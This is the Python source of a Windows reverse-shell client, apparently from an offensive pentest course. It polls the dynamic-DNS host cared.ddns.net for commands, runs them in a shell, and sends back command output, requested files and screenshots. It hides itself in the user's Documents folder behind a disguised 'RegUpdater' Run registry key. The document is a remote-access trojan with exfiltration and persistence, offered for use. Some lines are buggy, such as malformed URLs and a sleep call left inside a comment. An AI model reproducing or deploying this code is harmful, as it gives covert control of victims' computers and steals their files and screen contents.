
# Client side script for an http reverse shell


```python
# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Improved script

import os
import subprocess
import time
import winreg as wreg
import socket
import requests
import random
import shutil
import tempfile
from PIL import ImageGrab


def connecting(ip):
    while True:
        ipport = f"{ip}:8080"
        req = requests.get(ipport)
        command = req.text
        if 'terminate' in command:
            return 1
        elif 'grab' in command:
            grab, path = command.split("*")
            if os.path.exists(path):
                url = f"http://{ip}/store"
                files = {'file': open(path, 'rb')}
                r = requests.post(url, files=files)
            else:
                urlcomplete = f"http://{ip}/store"
                post_response = requests.post(url=urlcomplete, data='[-] Not able to find the file!'.encode())
        elif 'cd' in command:
            code, directory = command.decode().split('*')
        elif 'screencap' in command:
            dirpath = tempfile.mkdtemp()
            ImageGrab.grab().save(dirpath + "\img.jpg", "JPEG")
            url = f"http{ip}/store"
            files = {'file': open(dirpath + "\img.jpg", 'rb')}
            r = requests.post(url, files=files)
            files['file'].close()
            shutil.rmtree(dirpath)
        else:
            urlcomplete = f"http://{ip}:8080"
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            post_response = requests.post(url=urlcomplete, data=CMD.stdout.read())
            post_response = requests.post(url=urlcomplete, data=CMD.stderr.read())
        time.sleep(3)


def main():
    ip = socket.gethostbyname('cared.ddns.net')
    print(ip)
    connecting(ip)


if __name__ == '__main__':
    try:
        path = os.getcwd().strip('/n')
        Null, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode().split('=')
        destination = userprof.strip('\n\r') + '\\Documents\\' + 'client.exe'
        if not os.path.exists(destination):
            shutil.copyfile(f"{path}\client.exe", destination)
            key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
            wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
            key.Close()
        main()
    except Exception as e:
	    print(f"An error occurred: {e}") 
	    sleep_for = random.randrange(1, 10) #Sleep for a random time between 1-10 seconds time.sleep(int(sleep_for))

```